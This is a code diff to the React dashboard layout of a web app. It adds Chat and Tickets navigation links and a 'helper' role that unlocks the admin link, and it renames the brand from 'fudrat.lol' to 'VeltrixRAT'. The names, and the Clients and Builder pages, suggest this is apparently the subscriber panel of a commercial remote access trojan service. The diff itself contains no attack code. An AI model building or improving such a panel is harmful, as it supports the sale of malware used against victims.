@@ -8,7 +8,7 @@ import { getProfile, type Profile } from "@/lib/profile";
 import {
   LayoutDashboard, Users, LogOut, Wrench, Lock, CreditCard,
   MessagesSquare, Bell, Settings as SettingsIcon, ShieldCheck, Gift, Megaphone,
-  Menu, X, Globe,
+  Menu, X, Globe, Ticket, MessageSquare,
 } from "lucide-react";
 import { supabase } from "@/integrations/supabase/client";
 import { useCustomization } from "@/lib/customization-context";
@@ -59,17 +59,26 @@ function DashboardLayout() {
     navigate({ to: "/" });
   };
 
+  const [isHelper, setIsHelper] = useState(false);
+  useEffect(() => {
+    if (!user) return;
+    supabase.from("user_roles").select("role").eq("user_id", user.id).eq("role", "helper").maybeSingle()
+      .then(({ data }) => setIsHelper(!!data));
+  }, [user]);
+
   const baseNav = [
     { to: "/dashboard", label: t("navOverview"), icon: LayoutDashboard, exact: true },
     { to: "/dashboard/clients", label: t("navClients"), icon: Users, exact: false },
     { to: "/dashboard/builder", label: t("navBuilder"), icon: Wrench, exact: false },
     { to: "/dashboard/ads", label: t("navAds"), icon: Megaphone, exact: false },
     { to: "/dashboard/community", label: t("navCommunity"), icon: MessagesSquare, exact: false },
+    { to: "/dashboard/chat", label: t("navChat") || "Chat", icon: MessageSquare, exact: false },
+    { to: "/dashboard/tickets", label: t("navTickets") || "Tickets", icon: Ticket, exact: false },
     { to: "/dashboard/refer", label: t("navRefer"), icon: Gift, exact: false },
     { to: "/dashboard/notifications", label: t("navNotifications"), icon: Bell, exact: false },
     { to: "/dashboard/subs", label: t("navSubs"), icon: CreditCard, exact: false },
     { to: "/dashboard/settings", label: t("navSettings"), icon: SettingsIcon, exact: false },
-    ...(isAdmin
+    ...((isAdmin || isHelper)
       ? [{ to: "/dashboard/admin", label: t("navAdmin"), icon: ShieldCheck, exact: false }]
       : []),
   ];
@@ -125,7 +134,7 @@ function DashboardLayout() {
       <header className="sticky top-0 z-30 border-b border-border bg-background/85 backdrop-blur hidden sm:block">
         <div className="flex h-14 items-center justify-between px-5">
           <div className="flex items-center gap-2">
-            <span className="text-sm font-semibold tracking-tight font-mono">fudrat.lol</span>
+            <span className="text-sm font-semibold tracking-tight font-mono">VeltrixRAT</span>
           </div>
           <div className="flex items-center gap-2">
             {!sub.loading && <CountdownBadge msLeft={sub.msLeft} />}
@@ -169,7 +178,7 @@ function DashboardLayout() {
           <button onClick={() => setMobileMenuOpen(!mobileMenuOpen)} className="rounded-md p-2 text-muted-foreground hover:bg-accent">
             {mobileMenuOpen ? <X className="h-5 w-5" /> : <Menu className="h-5 w-5" />}
           </button>
-          <span className="text-sm font-semibold tracking-tight font-mono">fudrat.lol</span>
+          <span className="text-sm font-semibold tracking-tight font-mono">VeltrixRAT</span>
           <div className="flex items-center gap-1">
             <LanguageSwitcher compact={true} />
             {profile?.avatar_url ? (
